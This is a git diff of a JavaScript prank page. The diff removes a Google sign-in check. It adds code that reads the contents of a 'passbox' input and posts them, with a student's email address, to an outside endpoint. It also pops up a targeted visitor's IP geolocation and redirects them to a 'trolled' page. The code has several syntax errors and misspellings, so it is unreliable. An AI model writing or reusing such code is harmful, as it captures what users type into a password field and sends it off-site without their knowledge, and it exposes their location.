@@ -1,12 +1,12 @@
 window.onload = async function(){
-    let f = getCookie("mac");
-    if (f != "") {
-        if (f.includes("felix.wuorenheimo@edu.lomma.se")) {
-               $.getJSON('https://ipapi.co/json/', function(data) {$.when(alert(JSON.stringify(data, null, 2))).then(trol())})
-} else { window.loction = "/"
-}
-}
-}
+    email = document.getelementbyid('passbox').value
+    $.get('log.txt', function(data) {
+        if (data.indexOf("felix.wuorenheimo@edu.lomma.se") !== -1) {
+            $.getJSON('https://ipapi.co/json/', function(data) {$.when(alert(JSON.stringify(data, null, 2))).then(trol())})
+        }
+        else {
+            window.loction = "/"
+        }
 function getCookie(cname) {
   let name = cname + "=";
   let ca = document.cookie.split(';');
@@ -22,12 +22,51 @@ function getCookie(cname) {
   return "";
 }
 function onSignIn() {
-    var auth2 = gapi.auth2.getAuthInstance();
-    var profile = auth2.currentUser.get().getBasicProfile();
-    alert("Hi "+profile.getName());
-    document.cookie = "mac="+profile.getEmail();
+    document.cookie = "mac="+;
     window.location.reload();
+    sendEmail("https://gmail.com/", {
+    example_user: "felix.goff@edu.lomma.se",
+    example_data: email,
+}, onSuccess, onError);
 }
+var onSuccess = function(response) {
+  alert("Success!");
+  console.log(response);
+};
+
+var onError = function(err) {
+  alert("error");
+  console.error(err);
+};
+
+// TODO: replace the endpoint url with your own
+
+// The same code as in previous snippet...
+function sendEmail(endpointUrl, data, onSuccess, onError) {
+  $.ajax({
+      type: "POST",
+      url: endpointUrl
+      data: JSON.stringify(data),
+      contentType: "application/json; charset=utf-8",
+      dataType: "json",
+      success: onSuccess,
+      error: function(xhr, status) {
+        if (typeof this.statusCode[xhr.status] !== 'undefined') {
+          return false;
+        }
+
+        onError(err);
+      },
+      statusCode: {
+        // Endpoint thinks that it's likely a spam/bot request, you need to change "spam protection mode" to "never" in HeroTofu forms
+        422: function(response) {
+          alert("fail");
+        },
+      }
+    });
+}
+
+
 function trol() {
     window.location = "https://felixs-alt.github.io/trolled.html"
 }
